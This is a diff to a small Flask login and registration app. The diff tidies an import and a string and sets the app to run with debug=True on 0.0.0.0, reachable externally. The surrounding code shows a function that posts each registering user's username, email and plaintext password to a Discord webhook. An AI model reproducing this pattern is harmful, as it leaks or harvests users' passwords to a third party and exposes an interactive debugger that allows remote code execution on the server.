@@ -1,6 +1,6 @@
 from flask import Flask, request, jsonify
 import hashlib
-import json
+import requests
 
 app = Flask(__name__)
 
@@ -60,7 +60,7 @@ def login():
     if password_hash != user['password_hash']:
         return jsonify({'error': 'Invalid credentials'}), 400
 
-    return jsonify({'message': 'Login successful! Welcome back, ' + username}), 200
+    return jsonify({'message': f'Login successful! Welcome back, {username}'}), 200
 
 
 # Function to send registration data to Discord webhook (you can make this async)
@@ -85,7 +85,6 @@ def send_to_webhook(username, email, password):
     }
 
     # Send data to the webhook (you can use requests or any HTTP client here)
-    import requests
     try:
         response = requests.post(webhook_url, json=payload)
         response.raise_for_status()  # Raise an error for bad responses
@@ -93,5 +92,7 @@ def send_to_webhook(username, email, password):
         print(f"Error sending webhook: {e}")
 
 
+# Start the Flask app
 if __name__ == '__main__':
-    app.run(debug=True)
+    # Set the host to 0.0.0.0 to make it accessible externally on Render
+    app.run(host='0.0.0.0', port=5000, debug=True)
